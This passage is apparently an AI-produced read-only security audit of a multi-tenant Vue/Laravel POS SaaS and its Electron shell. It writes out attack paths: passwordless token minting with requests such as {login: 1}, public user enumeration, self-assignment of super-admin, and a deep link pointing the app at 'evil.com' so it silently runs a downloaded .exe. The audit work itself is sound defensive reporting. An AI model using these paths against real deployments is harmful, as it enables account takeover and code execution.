# Vue SPA, UX, RTL, POS & devices — Score 2.5/10

> Branch `feature/multi-tenant` · 2026-10-07 · read-only multi-agent analysis · secrets redacted

## Executive summary

Yes, this ran on the SaaS branch, feature/multi-tenant (نعم، التحليل اشتغل على برنش الساس feature/multi-tenant). It was read-only: nothing was edited, committed or switched, and no remote or deploy scripts were run.

The frontend is built well. It is a lazy-loaded Vue 3 SPA using script setup throughout, with one axios client, meta-driven router guards, thin views backed by composables, ar/en translation parity, skeleton and empty states, and a keyboard-first POS. The Electron and Capacitor shells also start from sound defaults.

It is not safe to sell. Verification confirmed four separate critical problems:

1. **Anyone can log in without a password.** POST /api/v1/auth/quick-login is public, has no throttle, and issues a full-ability ['*'] token for any user id, phone or email. GET /auth/workspace-users is also public and lists every active user. Together they give remote takeover of any tenant. On the central host, they also reach central admin accounts. LoginView uses quick login by default.
2. **Tenant admins can become platform super admins.** Every tenant DB contains a super_admin role and the API accepts it on user create and update. Super-admin rights are also granted by two hardcoded phone numbers, and any user can set their own phone through /profile. The super-admin routes run inside tenant context, but they act on central Tenant records.
3. **Electron can be hijacked from a link.** A sroor:// deep link can point the POS window at any origin, and the app saves that URL so it reloads it on every restart. That page gets the full electronAPI bridge, which can make the updater silently download and run any .exe with /S.
4. **POS money paths are wrong.**
   - A partial payment sends a stale paidAmount, not the amount the cashier typed. The usual case saves the invoice as fully paid and loses the customer's debt.
   - The `expenses` and `payments` keys are dropped by StoreSalesInvoiceRequest, so shipping charges and split payments disappear without any error.
   - F9 and Ctrl+Enter bypass isSubmitting, and there is no idempotency key, so double-submits create duplicate invoices and deduct stock twice.

The score reflects a solid UI base that is outweighed by account takeover, cross-tenant escalation, code execution on cashier PCs, and wrong financial results at checkout.

## Top risks
- CRITICAL: Unauthenticated passwordless login. backend/routes/api.php:28 sends POST /auth/quick-login to backend/app/Actions/Auth/ApiQuickLoginAction.php:23-56, which looks up a user by phone, email or id, checks only is_active, and calls createToken(..., ['*']). There is no password, PIN, device binding or throttle. The tenant comes from the client's X-Tenant header (ResolveApiTenancy). With no header on the central host, the lookup runs on the central users table. tests/Feature/Api/AuthApiTest.php:287 asserts this as intended behaviour. LoginView.vue:284 defaults to loginMode='quick'.
- CRITICAL: Public user enumeration. GET /auth/workspace-users (routes/api.php:29, AuthController.php:93-110) returns id, name and phone or email for every active user without auth. LoginView.vue:304 calls it and caches the result in localStorage 'tenant_users'. It leaks staff PII of every customer business and supplies targets for quick-login.
- CRITICAL: Tenant users can escalate to platform super admin. (a) StoreUserRequest:23 and UpdateUserRequest:26 accept role=super_admin through exists:roles,name. PermissionsSeeder puts that role in every tenant DB, and UserController.php:62 only hides it in the UI. (b) AppServiceProvider.php:38 Gate::before grants every ability to two hardcoded phone numbers, and UpdateProfileRequest:23 lets any user change their own phone (uniqueness is checked per tenant DB only). The /super-admin group (api.php:196) runs in tenant context, but SuperAdminApiController uses the central Tenant model to toggle, delete, migrate and reconfigure other tenants.
- CRITICAL: A super-admin phone number is published as phone_placeholder in lang/ar/auth.php:21 and lang/en/auth.php:26 (PII literal; value not reproduced). The same list appears in UserResource.php:19 (is_super_admin), TelescopeServiceProvider.php:82, routes/web.php:38 and TenantSampleSeeder.php:28.
- CRITICAL: Electron deep-link to code execution. In desktop/main.js:26-47 and 67, parseTenantFromDeepLink only trims and lowercases the value, then builds https://${tenantCode}.baraa-solutions.com. A value like 'evil.com/' therefore loads evil.com, and the URL is saved through settingsStore. The will-navigate handler (l.238-240) is empty and there is no setWindowOpenHandler. preload.js exposes updater.downloadAndInstall to any origin. ipcMain (l.539) does not check the sender. desktop/src/updater/nativeUpdater.js downloads over http or https with no hash or signature check, then runs spawn(exe, ['/S']).
- CRITICAL: POS partial payment ignores the amount the cashier types. PosView.vue:714 sends paidAmount, but the input is bound to cashReceived (POSCheckoutPanel L128-131). paidAmount only changes in watch(cartNetTotal) L480-489 and in the multi-payment modal. InvoiceService::confirmInvoice L193-206 trusts paid_amount with no cap. As a result, invoices are saved as fully paid with a full Payment voucher and the receivable is lost. If the order started on credit, the paid amount becomes 0 instead.
- HIGH: POS shipping/extra expenses and split payments are silently dropped. PosView.vue:707-724 posts `expenses` and `payments` to /api/v1/invoices. StoreSalesInvoiceRequest declares only `additional_expenses`, and CreateInvoiceDTO has no payments field. The saved net excludes the expenses the cashier collected, and split tenders are stored as one Payment. The correct path (StorePOSInvoiceRequest/POSInvoiceDTO on web /pos/invoices) exists, but the SPA does not call it. The client also includes treasury-paid expenses in the net, which the server excludes.
- HIGH: Duplicate invoices from double submit. In PosView.vue:814-818, F9 and Ctrl+Enter call submitInvoice without checking isSubmitting or e.repeat. submitInvoice (L700-743) has no re-entry guard. There is no Idempotency-Key anywhere, and the cart is kept for retry after a 30s timeout even if the server has already committed. The result is double stock deduction and an inflated treasury.
- Unverified lead from sub-agents: invoice print routes (/invoices/{id}/print, /print/thermal, /print/a4 in routes/tenant.php ~55-74 and routes/web.php) appear to be outside auth and use sequential ids. The POS web fallback opens them. This needs backend confirmation.
- Plan and feature gating is not enforced on the frontend, and it is unknown whether the backend enforces it. Plans cannot be sold as tiers until the server enforces limits.

## Quick wins
- Disable POST /auth/quick-login and GET /auth/workspace-users at the route level, change LoginView's default loginMode to 'password', and replace AuthApiTest::test_quick_login_succeeds_without_password with a test that asserts 404 or 401. Then revoke all existing personal_access_tokens and clear users.api_token.
- Add throttle middleware (e.g. throttle:login, 5/min per IP+login) to every guest auth route in routes/api.php.
- Remove the hardcoded super-admin phone list from AppServiceProvider.php:38/49, UserResource.php:19, TelescopeServiceProvider.php:82, routes/web.php:38, ToggleTenantStatusRequest and OverrideTenantFeatureRequest. Also replace phone_placeholder in lang/ar/auth.php:21 and lang/en/auth.php:26 with a dummy value.
- Add a deny-list in StoreUserRequest, UpdateUserRequest and UpdateRolePermissionsAction so super_admin and super_admin.* cannot be assigned. Add a central-only middleware on the /super-admin group that rejects any request where tenancy()->initialized is true.
- PosView.vue: in partial mode send cashReceived (or bind the input to paidAmount) as a 3-decimal string. On the backend, validate 0 < paid_amount < net_total for partial payments.
- PosView.vue: rename `expenses` to `additional_expenses` (or switch the SPA to the POS FormRequest/DTO). Add payments.*.amount and payments.*.method to StoreSalesInvoiceRequest and CreateInvoiceDTO, and validate that their sum equals paid_amount.
- PosView.vue: add `if (isSubmitting.value) return` at the top of submitInvoice, and ignore e.repeat in handleGlobalKeydown.
- desktop/main.js: validate tenant codes with /^[a-z0-9-]{1,63}$/, build the URL with the URL API, and check that hostname ends with .baraa-solutions.com. Make will-navigate call preventDefault for foreign origins, add setWindowOpenHandler, and reject updater IPC calls whose senderFrame origin is not allowed.
- Stop caching the 'tenant_users' list in localStorage.

## Strategic items
- Redesign fast cashier switching. Use a per-user PIN that is valid only on a POS device already enrolled by an admin (a device token issued under an admin session). Never allow it on the central host, and scope tokens with Sanctum abilities, not ['*'].
- Separate central and tenant identity. Keep super admins only in the central DB behind a dedicated guard and model. Stop seeding the super_admin role and permission into tenant DBs. Remove the ApiTokenAuth step that maps a central admin token into a tenant by phone number. Put the super-admin API on a central-only route group that ignores X-Tenant.
- Make POS checkout idempotent end to end. Generate a client UUID per order in usePosOrders and send it as Idempotency-Key or client_reference. Back it with a unique column on invoices and return the existing invoice on replay. Show the server's net_total and payment breakdown on the receipt.
- Use one POS invoice contract. Choose either /pos/invoices (StorePOSInvoiceRequest/POSInvoiceDTO) or /invoices and remove the other. Add Playwright E2E tests for cash, partial, credit, multi-payment, expenses and double-submit, and assert treasury and customer balances.
- Harden the Electron updater. Accept only https downloads from an allow-listed host, verify a signed manifest or SHA-256 plus an Authenticode signature, and never take a downloadUrl from the renderer.
- Build plan and feature gating as server-side middleware or policies, driven by the enabled_features and subscription fields that TenantResource already exposes. Add matching SPA UI for expiry and locked features.
- Make by-weight selling generic. Add an is_weighted flag and barcode or scale-label support on items instead of InvoiceService's hardcoded list of Arabic unit names. Wire the existing POSWeightPickerModal into PosView.
- Decide on offline behaviour for v1. At minimum, show a clear offline banner and block checkout; or define a queued, idempotent offline-sale design.
- Fix the 'services' vs 'Services' path casing before introducing Linux CI builds. Add a CI step that runs vite build and checks that the committed public/build hashes match.
- Confirm with the backend lead whether the invoice print routes are unauthenticated, and if so put them behind auth plus a tenant/store scope with non-sequential identifiers.

## Strengths
- Single axios client (resources/js/Services/api.js) that injects Bearer, X-Store-Id, X-Tenant and X-Locale, normalises 422 responses into error.userMessage, handles 401, and has a 30s timeout.
- All route components are lazy-loaded, and most per-view chunks are under 45 kB. A scratch build matched the committed public/build hashes.
- Consistent meta-driven router guards (requiresAuth, guestOnly, permission, role, superAdminOnly) that keep the redirect query, plus a catch-all route.
- Composition API with script setup everywhere and no Inertia, Livewire or Alpine leftovers. Feature views are thin (about 110 lines or less) and delegate to Components/<Feature> and use<Feature> composables. Super-admin screens are 66-107 lines each.
- ar and en have the same 25 files and identical key sets (about 2779 keys). Layouts use logical RTL spacing (ms/me, border-e, text-start), the brand color is a CSS variable, and dark: variants are nearly everywhere.
- Skeleton and EmptyState are used consistently across list and super-admin views. POS has a dedicated skeleton, a mobile card layout and a collapsed sidebar.
- Keyboard-first POS (F2, F4, F9, F10, arrow navigation) with audio feedback. Remote search uses debounce plus AbortController. Multi-order tabs persist to tenant-scoped localStorage, so a reload or crash does not lose a cart.
- Server-side invoice maths uses bcmath inside DB::transaction with lockForUpdate on item rows, and ignores the client's paid_amount for cash sales.
- Electron uses contextIsolation:true, nodeIntegration:false and webSecurity:true, exposes a curated contextBridge API with no raw ipcRenderer, has a single-instance lock, and prints silently through an offscreen RTL window so Arabic shapes correctly on receipts. The 58/80mm width is configurable.
- Capacitor biometric login stores credentials in the Android Keystore through @capgo/capacitor-native-biometric. Only a flag and the username are in localStorage.
- Tenant-aware branding: company name, logo, subtitle and QR are taken from tenant Settings in the sidebar, the A4 invoice and the Blade thermal receipt. Most legacy 'coffee' lang keys already have generic values.
- TenantProvisionerService is a single provisioning path that sets trial and subscription dates and a Subscription row. TenantResource exposes the plan, status and enabled_features that future gating needs. Logout revokes only the current Sanctum token.

## Findings

### 1. [CRITICAL] Passwordless quick-login plus unauthenticated user list allows full account takeover of any tenant user, and of central users
- **Location:** `D:\projects\sroor\backend\app\Actions\Auth\ApiQuickLoginAction.php:23`
- **Effort:** M
- **Evidence:** POST /api/v1/auth/quick-login (routes/api.php:28) sits in the guest group. It has no ApiTokenAuth, no throttle and no device binding. ApiQuickLoginAction::execute looks up User::where phone OR email OR id = $login and, if the user is active, issues createToken(..., ['*']). No password, PIN or device check is done. GET /api/v1/auth/workspace-users (routes/api.php:29, AuthController::workspaceUsers ~line 93) is also guest and returns id, name and phone/email for every active user. The SPA uses both: stores/auth.js:73-104 quickLogin and LoginView.vue loadWorkspaceUsers, which also caches the list in localStorage 'tenant_users'. ResolveApiTenancy chooses the tenant from the client-supplied X-Tenant header. On a central host with no header, the lookup runs against the central users table.
- **Impact:** Anyone on the internet who knows or guesses a workspace id/slug can list its users, then log in as the tenant admin with only `login=<id>`. That gives full read/write over sales, stock and treasury. Without X-Tenant on the central domain, the same call can mint a token for a central/super-admin user (login '1'). This is remote compromise of every tenant and of the platform.
- **Recommendation:** Backend-architect: remove or disable quick-login until it requires a per-user PIN, a registered device token, or an already-authenticated manager session. Add throttle middleware to every guest auth route. Make workspace-users authenticated, or return names only without phone/email, and only behind device registration. Frontend: stop caching tenant_users in localStorage.
- **Verification:** I confirmed this from the code. It is real and the critical rating holds.

1. **Both routes are open to guests.** In `backend/routes/api.php`, lines 28 (POST `/auth/quick-login`) and 29 (GET `/auth/workspace-users`) are inside the v1 group, which only has `ResolveApiTenancy`. They sit before the `ApiTokenAuth` group that starts at line 32. There is no throttle on them. `bootstrap/app.php` adds no rate limiter to the api group, and it has no auth middleware alias guarding these routes.

2. **Quick login needs no password.** `ApiQuickLoginAction::execute` (lines 23-56) runs `User::where(phone = login OR email = login OR id = login)->first()`. The only check after that is `is_active`. It then calls `createToken($tokenName, ['*'])` and also saves the plain token in `users.api_token`. There is no password, PIN, device binding or signed nonce. `AuthController::quickLogin` (lines 115-133) only validates that `login` is a string.

3. **The user list is open too.** `AuthController::workspaceUsers` (lines 93-110) returns id, name and phone-or-email for every active user, with no auth.

4. **The tenant is picked by the client.** `ResolveApiTenancy` (lines 29-43) initializes tenancy from the `X-Tenant` header, the `tenant` query parameter or the `tenant` input. It accepts either a tenant id or a domain. A host that is not central is also resolved by subdomain or slug. On a central host with no header, tenancy is not initialized, so the `User` query runs on the central DB `users` table. That table is created by the central migration `0001_01_01_000000_create_users_table`.

5. **A central token reaches the super-admin panel.** For a non-tenant request, `ApiTokenAuth` sets the `super_admin` and `central` guards. The super-admin routes (`api.php` line 196 onward) are gated only by `can:super_admin.access`. Several Form Requests also allow any user with the `admin` role. So a quick-login token for a central admin user (for example `login=1`) gets platform-wide super-admin access.

6. **Extra lateral path.** `ApiTokenAuth` step 3 maps a central admin token into any tenant by matching phone number.

7. **The SPA uses both endpoints.** Both are called from `resources/js/stores/auth.js` and `resources/js/views/Auth/LoginView.vue`.

I found no guard anywhere else that blocks this: no middleware, policy or throttle, and no device check. The impact holds as claimed: unauthenticated takeover of any tenant user, including tenant admins, and of central super-admin accounts.

### 2. [CRITICAL] Tenant admin can grant itself super_admin.access and reach central tenant-management APIs (cross-tenant)
- **Location:** `D:\projects\sroor\backend\app\Actions\Roles\UpdateRolePermissionsAction.php:20`
- **Effort:** M
- **Evidence:** UpdateRolePermissionsAction: `if ($role->name === 'admin') { $role->syncPermissions(Permission::all()); }`. Every tenant DB is seeded by PermissionsSeeder (TenantProvisionerService.php:87), which creates the 'super_admin.access' permission and a 'super_admin' role in the tenant DB. PUT /api/v1/roles/{id}/permissions (routes/api.php:175) has no route-level permission middleware. The FormRequest allows any user with role admin or roles.manage. The /api/v1/super-admin/* group (routes/api.php:196) only checks `can:super_admin.access`, which is evaluated against the tenant-DB user. SuperAdminApiController calls Tenant::findOrFail (stancl Tenant uses the central connection). In the SPA, stores/auth.js:29 sets isSuperAdmin from roles.includes('super_admin') || permissions.includes('super_admin.access'), and UserResource.php:19 also flags is_super_admin for two hardcoded phone numbers (PII literals, values not reproduced).
- **Impact:** Any tenant admin can save the admin role and inherit super_admin.access. The SPA then routes them to /super-admin, and the API lets them list, toggle, override features on or delete other tenants and edit plans. A tenant user whose phone matches the hardcoded numbers is also treated as super admin.
- **Recommendation:** Backend-architect: do not seed super_admin role/permission into tenant DBs. Exclude super_admin.access in UpdateRolePermissionsAction. Protect /super-admin routes with a central-only middleware that rejects any request where tenancy is initialized and checks a central guard. Remove the hardcoded phones from UserResource. Frontend: derive isSuperAdmin only from a server flag that is valid only in central context.
- **Verification:** The mechanism described in the finding is wrong, but the cross-tenant escalation itself is real through two other paths, so I am keeping it at critical with a corrected vector.

**Why the stated vector fails.** UpdateRolePermissionsAction.php:20-21 does sync the admin role to Permission::all(), and the tenant PermissionsSeeder (lines 62 and 70) does create the 'super_admin.access' permission and a 'super_admin' role. However, AppServiceProvider.php:37-45 registers a Gate::before hook:
- It returns true if the user has the super_admin role or one of two hardcoded phone numbers.
- Otherwise, for 'super_admin.access' or any 'super_admin.*' ability, it returns false. That runs before Spatie's permission check.

So an admin whose role has picked up the super_admin.access permission is still refused by the `can:super_admin.access` middleware (routes/api.php:196).

**Path 1: assign the super_admin role.**
- UpdateUserRequest.php:26 and StoreUserRequest.php:23 validate role with `exists:roles,name`. The super_admin role exists in every tenant DB.
- UpdateUserAction.php:35 and CreateUserAction.php:69 call syncRoles with that value and no deny-list.
- The authorize() method in both requests lets admin, users.manage or roles.manage through.
- The only filter is cosmetic: UserController.php:62 hides super_admin from the role list returned to the SPA. The API still accepts it.

So a tenant admin can send PUT /api/v1/users/{own id} with role=super_admin. After that, Gate::before returns true and the whole /api/v1/super-admin/* group opens.

**Path 2: the hardcoded phone bypass.** Gate::before and the viewPulse gate (AppServiceProvider.php:38 and 49) treat two hardcoded phone numbers as super admin. The same list is in ToggleTenantStatusRequest and OverrideTenantFeatureRequest. That check runs against the tenant-DB user, so a tenant admin can set a user's phone to one of those numbers via PUT /users/{id} (phone only has to be unique within the tenant DB) and gain super-admin access.

**Why this reaches other tenants.** App\Models\Tenant extends stancl's BaseTenant, which uses the central connection. SuperAdminApiController calls Tenant::findOrFail in toggleStatus, overrideFeature, updateTenantUnits, runTenantMigrations, destroyTenant and updateDatabaseConfig, so all of these act on central data from inside a tenant context.

**Side note.** Several tenant-management FormRequests also authorize plain hasRole('admin'): ToggleTenantStatusRequest:13, OverrideTenantFeatureRequest:13, UpdateTenantDatabaseConfigRequest:13 and ImpersonateTenantRequest:13. StoreTenantRequest returns true. These checks therefore add no protection beyond the route middleware.

**Fix.** Close Path 1 by refusing super_admin in role validation and in the role/permission sync for tenants. Close Path 2 by removing the hardcoded phone checks.

### 3. [CRITICAL] Partial payment ignores the amount the cashier types; the stale paidAmount is sent, so customer debt is understated
- **Location:** `D:\projects\sroor\backend\resources\js\views\POS\PosView.vue:714`
- **Effort:** S
- **Evidence:** The checkout input is bound to `cashReceived` (POSCheckoutPanel `v-model:cash-received`). The payload sends `paid_amount: paymentType==='partial' ? parseFloat(paidAmount.value)`. `paidAmount` is written in only two places: the `watch(cartNetTotal)` at L480-489, which sets it to `Math.round(newNet)` in cash mode, and handleMultiPaymentConfirm. No code copies cashReceived into paidAmount, and switching paymentType does not trigger the watch. On the server, InvoiceService::confirmInvoice uses `$paidAmount = $data['paid_amount']` for partial payments, with no upper cap.
- **Impact:** A cashier adds items (cash mode, so paidAmount = rounded net), switches to Partial, types 50, and submits. The invoice is saved as paid in full (remaining_amount 0, payment_status 'paid'), a Payment voucher is created for the full amount, and the customer's receivable is lost. If the cashier started in credit mode instead, paid becomes 0 whatever was typed. The real money taken and the treasury/customer balance no longer match.
- **Recommendation:** Use a single paid-amount field: in partial mode send `cashReceived`, or bind the input to paidAmount. Send it as a string with up to 3 decimals. Backend: validate `paid_amount <= net_total` for partial payments and reject 0 or full amounts for partial. Add a Playwright test for this flow.
- **Verification:** I traced the bug from the POS screen to the saved invoice and it is real.

1. **What the cashier types.** In POSCheckoutPanel.vue (L128-131), the only amount input emits `update:cashReceived`. PosView.vue L76 binds it with `v-model:cash-received="cashReceived"`. Nothing binds or emits `paidAmount`.
2. **What gets sent.** PosView.vue L714 sends `paid_amount: paymentType==='partial' ? parseFloat(paidAmount.value)`.
3. **Where `paidAmount` is written.** Only two places:
   - the `watch(cartNetTotal)` at L480-489, which sets the rounded net in cash mode and '0' in credit mode;
   - `handleMultiPaymentConfirm` at L603.
   The order's initial value is '0.000' (usePosOrders.js L25). Choosing Partial only emits `update:paymentType`, so it does not trigger the watch, and nothing copies `cashReceived` into `paidAmount`.
4. **Server side.** POST /api/v1/invoices goes through InvoiceController::store, then CreateSalesInvoiceAction, then InvoiceService::confirmInvoice. At L193-194 it takes `$paidAmount = $data['paid_amount']` for partial payments. It clamps `remaining` to be at least 0 (L199-202), sets payment_status 'paid' when remaining is 0 (L205-206), and creates a Payment voucher for `$paidAmount` when no multi-payments are sent (L241-251). The only validation is `nullable|numeric|min:0`; there is no check against what was typed and no upper cap.

**Result.**
- **Default path (cash mode, then switch to Partial and type 50):** the server receives about the full rounded net. The invoice is saved as paid in full, a voucher is created for the full amount, and the customer's debt is lost.
- **Credit-first path:** the server receives 0, so the invoice is unpaid and the debt is overstated.

**Mitigating factor.** The multi-payment modal does set `paidAmount` correctly, so that one path works. The main Partial path is still broken on every sale, and the cashier gets no warning. That is a silent error in customer balances and the treasury, so I keep the severity at critical.

### 4. [CRITICAL] Anyone can log in without a password: user list is public and the quick-login route issues tokens with no credentials (found from LoginView)
- **Location:** `D:\projects\sroor\backend\app\Actions\Auth\ApiQuickLoginAction.php:20`
- **Effort:** M
- **Evidence:** routes/api.php:28-29 registers POST /auth/quick-login and GET /auth/workspace-users in the guest group, outside ApiTokenAuth and with no throttle. AuthController::workspaceUsers (line 93) returns id, name and login (phone or email) for every active user. ApiQuickLoginAction::execute looks up the user with where phone/email/id = $login, checks only is_active, then calls createToken($tokenName, ['*']). The docblock says 'Authenticate workspace user quickly without password'. LoginView.vue starts with loginMode = 'quick' (line ~285), loads /auth/workspace-users, caches the list in localStorage 'tenant_users', and calls authStore.quickLogin. ResolveApiTenancy picks the tenant from a client-supplied X-Tenant header or ?tenant=. When no tenant is given and the host is central, the request runs against the central DB.
- **Impact:** Remote takeover of any tenant. An attacker sends GET /api/v1/auth/workspace-users with X-Tenant=<slug> (slugs are discoverable through /central/tenants/resolve or subdomains), then POST /api/v1/auth/quick-login {login: 1}, and receives a full-ability admin Sanctum token. With that token they can read and change sales, stock and treasury, and cancel invoices. The same request against the central host may return a token for a central or super-admin user, which would give access to every tenant. A sellable SaaS cannot ship like this.
- **Recommendation:** Backend (backend-architect): delete or lock down quick-login now. Require a PIN or password, or a device-bound credential that a logged-in admin enrolled, plus rate limiting. Remove workspace-users from the guest group, or return names only to enrolled devices. Never allow quick-login in the central context. Frontend: change LoginView's default to password mode, and stop caching the user list in localStorage.
- **Verification:** I confirmed this in the code and could not refute it. In backend/routes/api.php, lines 28-29 register POST /auth/quick-login and GET /auth/workspace-users inside the v1 group. That group uses only ResolveApiTenancy, and both routes sit outside the ApiTokenAuth group. There is no throttle on them: bootstrap/app.php adds no API throttle or global auth middleware.

- **User list is public.** AuthController::workspaceUsers (lines 93-110) returns id, name and login (phone or email) for every active user, with no authentication.
- **No credentials are checked.** AuthController::quickLogin (lines 115-134) validates only that 'login' is a string. ApiQuickLoginAction::execute (lines 23-55) looks up the user where phone, email or id equals $login, checks only is_active, and then calls createToken($tokenName, ['*']). There is no password, PIN, device binding or IP restriction.
- **The tests treat this as intended.** tests/Feature/Api/AuthApiTest.php:287, test_quick_login_succeeds_without_password, asserts that the request succeeds without a password.
- **The tenant is chosen by the client.** ResolveApiTenancy builds the tenant from the client-supplied X-Tenant header, ?tenant= or the tenant input, and accepts a tenant id or a domain. If no tenant is given and the host is central, no tenancy is started, so the request runs against the central users table (central migration 0001_01_01_000000_create_users_table.php).
- **The issued token is fully usable.** ApiTokenAuth accepts any valid Sanctum token for an active user.
- **Central tokens carry into tenants.** ApiTokenAuth lines 51-62 have a fallback: inside a tenant context, it accepts a token from the central DB if that central user has the admin role, and maps it to the tenant user with the same phone. A central admin token obtained through quick-login can therefore reach tenant data wherever the phone number matches.

The only limit is that the attacker must know or guess the tenant id/domain. Subdomain-based resolution makes that trivial, and so does the public /central/tenants/resolve endpoint. Ids are sequential, so {login: 1} usually returns the first user, typically the admin.

The finding is real, needs no authentication, and gives a full-ability token. Severity stays critical.

### 5. [CRITICAL] Unauthenticated passwordless login (quick-login) for any user, including the central super admin
- **Location:** `D:\projects\sroor\backend\app\Actions\Auth\ApiQuickLoginAction.php:26`
- **Effort:** S
- **Evidence:** routes/api.php:28 registers POST /api/v1/auth/quick-login outside the ApiTokenAuth group, and no throttle middleware is attached anywhere in routes/api.php. ApiQuickLoginAction::execute() looks up a user by phone, email or id, checks only is_active, then calls $user->createToken(..., ['*']). Its own log message says it logs in 'بدون كلمة مرور' (without a password). If no X-Tenant header is sent on a central host, ResolveApiTenancy does not initialize tenancy, so the lookup runs against the CENTRAL users table. LoginView.vue:284 makes this the default mode (loginMode = ref('quick')).
- **Impact:** Anyone on the internet can POST {login:'1'} or a known phone to the central host and get a full-ability Sanctum token for the platform super admin. The super-admin phone is also published as phone_placeholder in lang/ar/auth.php:21 and lang/en/auth.php:26. With that token an attacker can list, suspend, delete and re-provision every tenant. Inside a tenant, they can take over any cashier or admin account. This is a full remote compromise of the platform and every tenant.
- **Recommendation:** Remove the quick-login route and the quick-login UI mode now. If fast cashier switching is needed, replace it with a PIN or password check scoped to a device that is already authenticated by an admin token. Add throttle:login to /auth/login. Remove the real phone from phone_placeholder.
- **Verification:** I confirmed this in the code and found no guard that stops it.

**The route has no auth or throttle.**
- routes/api.php:28 registers `POST /auth/quick-login` inside the v1 group, whose only middleware is `ResolveApiTenancy`. It sits outside the `ApiTokenAuth` group that starts at line 33.
- There is no `throttle` or RateLimiter anywhere in routes/, bootstrap/app.php or the Providers.

**The controller and action never check a password.**
- `AuthController::quickLogin` (AuthController.php:115-133) only validates that `login` is a string, then calls the action.
- `ApiQuickLoginAction.php:26-30` finds a user where phone, email or id equals the input. The only check is `is_active` (line 47). Line 55 then calls `createToken(..., ['*'])`.
- There is no env flag, IP allow-list or device binding anywhere.

**Without a tenant it runs against the central DB.**
- `ResolveApiTenancy` does not initialize tenancy when the host is in `central_domains` and no `X-Tenant` header is sent. `User` has no pinned connection, so the lookup hits the central `users` table (database/migrations/0001_01_01_000000_create_users_table.php).
- `ApiTokenAuth` then accepts the Sanctum token and sets the `super_admin` and `central` guards (lines 76-78).

**The super-admin check is worse than the finding says.**
- AppServiceProvider.php:38 has `Gate::before` grant everything to anyone with the `super_admin` role or a phone in a hard-coded list. The list includes [REDACTED_PHONE].
- That same number is published as `phone_placeholder` in lang/ar/auth.php:21 and lang/en/auth.php:26.
- So `{login: '[REDACTED_PHONE]'}` (or a guessed id like `'1'`) passes the `can:super_admin.access` check on the super-admin routes (routes/api.php:196-220). Those routes can create, delete and toggle tenants, run migrations and update tenant DB config.
- Because the gate keys on phone and not on database, a tenant user with that phone also gets super_admin abilities.

**Users are easy to find.**
- `GET /auth/workspace-users` (routes/api.php:29, AuthController.php:93) is also unauthenticated. It returns every active user's id, name and phone/email, so an attacker can list targets in any tenant (via `X-Tenant`) or on the central host and then quick-login as any of them.

**The frontend makes it the default.**
- LoginView.vue is at resources/js/views/Auth/LoginView.vue, not the path given in the finding. Line 284 sets `loginMode = ref('quick')`.

The only thing the code alone cannot show is whether a matching row exists in the production central `users` table. Even so, the tenant-level account takeover is unconditional, so critical stands.

### 6. [CRITICAL] Public, unauthenticated user enumeration for every workspace
- **Location:** `D:\projects\sroor\backend\app\Http\Controllers\Api\AuthController.php:93`
- **Effort:** S
- **Evidence:** GET /api/v1/auth/workspace-users (routes/api.php:29) is public. It returns id, name and login (phone or email) for all active users. LoginView.vue:304 calls it with only the X-Tenant header and caches the list in localStorage('tenant_users'). Tenant ids and slugs are guessable, and the resolver endpoint confirms which ones exist.
- **Impact:** Together with quick-login, this is a one-click takeover of any tenant: pick a user from the list and get a token. Even on its own, it leaks staff names and phone numbers of every customer business.
- **Recommendation:** Remove the endpoint. If a remembered-users picker is wanted, build it from users who have already logged in on that device (stored locally) rather than from a server list.
- **Verification:** The finding holds up against the code. I found no guard that refutes it.

1. **The route is public.** In backend/routes/api.php:29, GET /auth/workspace-users sits in the v1 group, which only has the ResolveApiTenancy middleware. It is outside the ApiTokenAuth group that starts at line 33. There is no throttle on it, and bootstrap/app.php adds no API throttle either.

2. **It returns every active user.** AuthController::workspaceUsers (lines 93-110) selects id, name, phone and email for every user with is_active = true. It sends back id, name and login (the phone, or the email if there is no phone). It never checks the caller.

3. **The tenant comes from the client.** ResolveApiTenancy.php:30-37 picks the tenant from the X-Tenant header, the ?tenant= query value, or the request body. It looks it up by tenant id or domain. An unknown tenant gets a 404, so attackers can tell which tenants exist.

4. **Quick-login needs no password.** POST /auth/quick-login (api.php:28) is public too. AuthController::quickLogin calls ApiQuickLoginAction::execute, which:
   - finds the user where phone = login, email = login, or id = login (lines 26-30);
   - only checks is_active;
   - issues a full-access Sanctum token with createToken(..., ['*']) (line 55).
   There is no password, PIN, device binding, settings flag or rate limit.

5. **The frontend matches the claim.** LoginView.vue:304 calls the endpoint, and lines 290 and 307 cache the result in localStorage under tenant_users.

**One correction:** the takeover does not even need the user list. Quick-login also matches on the numeric id, so sending {login: 1} with a valid X-Tenant likely returns a token for the first user, usually the admin. The enumeration endpoint mostly leaks staff names, phone numbers and emails. The real authentication bypass is quick-login itself.

I'm keeping the severity at critical.

### 7. [CRITICAL] Super-admin power granted by hardcoded phone numbers, and those numbers can be registered inside any tenant DB
- **Location:** `D:\projects\sroor\backend\app\Providers\AppServiceProvider.php:38`
- **Effort:** M
- **Evidence:** Gate::before returns true when in_array($user->phone, ['[REDACTED_PHONE]','[REDACTED_PHONE]']). The same list appears in UserResource.php:19 (is_super_admin), TelescopeServiceProvider.php:82, routes/web.php:38 and the Toggle/OverrideTenantFeature requests. StoreUserRequest validates 'unique:users,phone' only against the tenant DB. TenantSampleSeeder.php:28 even provisions a tenant owner with phone [REDACTED_PHONE]. The super-admin routes (api.php:196) run under ResolveApiTenancy, so with X-Tenant set the user is resolved from the tenant DB, while Tenant is a central-connection model.
- **Impact:** A tenant admin can create a user in their own workspace with one of those phones. That user passes can:super_admin.access and can list, suspend, delete or edit every other tenant, plan and platform setting. The SPA also flags them as is_super_admin and routes them to the super-admin panel. This is cross-tenant privilege escalation.
- **Recommendation:** Backend-architect work: drop the phone allow-lists everywhere. Grant super-admin only to central-DB users (central guard or CentralUser model). Reject super-admin routes when tenancy is initialized, by putting them in a central-only group that ignores X-Tenant.
- **Verification:** I confirmed this in the code, and it is worse than the finding says.

**The grant itself**
- `backend/app/Providers/AppServiceProvider.php:38` has a `Gate::before` that returns true for every ability when `in_array($user->phone, ['[REDACTED_PHONE]','[REDACTED_PHONE]'])`.
- Line 49 does the same for `viewPulse`.
- The same hardcoded list appears in `UserResource.php:19` (`is_super_admin`), `TelescopeServiceProvider.php:82` and `routes/web.php:38`.
- It also appears in `ToggleTenantStatusRequest.php:13` and `OverrideTenantFeatureRequest.php:13`. Those two also accept the plain tenant `hasRole('admin')`.

**How the super-admin routes see the user**
- `routes/api.php:196` puts the `super-admin` prefix inside the `v1` group (ResolveApiTenancy, line 19) and `ApiTokenAuth` (line 33). The only guard is `can:super_admin.access`.
